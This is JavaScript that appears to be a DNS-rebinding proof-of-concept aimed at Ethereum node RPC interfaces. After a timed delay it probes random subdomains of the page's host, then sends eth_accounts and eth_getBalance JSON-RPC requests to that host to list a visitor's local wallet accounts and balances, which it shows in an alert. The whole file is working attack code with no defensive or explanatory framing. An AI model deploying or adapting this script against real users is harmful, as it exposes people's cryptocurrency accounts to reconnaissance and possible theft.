	var allRes = {};

	function hackThePlanet(){

		setTimeout(function(){ 
			doHackIt(1);

		}, 55000);
	}

	function doHackIt(num){
		if(num > 5)return;

		//console.log("Trying ... "+num);
		simpleGET('http://next'+Math.floor(Math.random() * 1000)+'.'+window.location.host,num);

	}

	function simpleGET(url,num){
		document.getElementById('jfc').onerror = function(){ 
			setTimeout(function(){
				getAccounts(num)
			},1000)
		}
		document.getElementById('jfc').src = url;

	}

	function getAccounts(num){
		

		var xhr = new XMLHttpRequest();
		try{
		xhr.open('POST', 'http://'+window.location.host, false);
		xhr.setRequestHeader("Content-Type", "application/json");
		xhr.send('{"jsonrpc":"2.0","method":"eth_accounts","params":[],"id":1}');
		}catch(e){
			//console.log("Connection prolly refused");
			//console.log(e.message);
			return;
		}

		try{
			getAccountBalances(JSON.parse(xhr.responseText)['result']);
		}catch(e){
			setTimeout(function(){
				//console.log("Could not get accounts");
				//console.log(e.message);
				doHackIt(num+1);
			},5000)
		}
	}		

	function getAccountBalances(array){

		for(var i=0; i < array.length; ++i){
			getBalance(array[i],1);
		}

		printData()
	}

	function getBalance(account, num){
		if(num > 5)return;

		var xhr = new XMLHttpRequest();

		xhr.open('POST', 'http://'+window.location.host, false);
		xhr.setRequestHeader("Content-Type", "application/json");
		xhr.send('{"jsonrpc":"2.0","method":"eth_getBalance","params":["'+account+'", "latest"],"id":1}');
		try{
			res = JSON.parse(xhr.responseText)['result'];
       		allRes[account] = res;
       	}catch(e){
       		//console.log("Could not get balance");
       		getBalance(account, num+1);
       	}
	}		

	function printData(){
		var keys = Object.keys(allRes)
		var str = "Found "+keys.length+" ether accounts\n"
		for(var i = 0; i < keys.length; ++i){
			str += keys[i] + " --> "+(parseInt(allRes[keys[i]],16)/1000000000000000000)+"\n";
		}
		alert(str);
	}
